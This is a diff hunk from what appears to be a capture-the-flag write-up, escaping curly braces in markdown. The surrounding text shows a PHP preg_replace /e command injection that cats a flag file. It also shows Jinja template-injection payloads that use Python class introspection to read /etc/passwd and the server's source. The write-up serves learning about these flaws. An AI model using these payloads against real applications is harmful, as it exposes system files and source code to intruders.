@@ -126,14 +126,14 @@ by adding in the filter field `/e system("cat flag_name_dont_guess_plz index.php
 
 ### Mask : Web Challenge
 
-By testing  `{{1+1}}`, we confirm that we are using `flask` framework. Let try to injection `python` code to read local files
+By testing  `\{\{1+1\}\}`, we confirm that we are using `flask` framework. Let try to injection `python` code to read local files
 
 ```python
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+\{\{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() \}\}
 ```
 but we couldn't find any interesting files, so lets read the server file itself.
 
-`{{ ''.__class__.__mro__[2].__subclasses__()[40]('server.py').read() }}`
+`\{\{ ''.__class__.__mro__[2].__subclasses__()[40]('server.py').read() \}\}`
 
 
 ```python
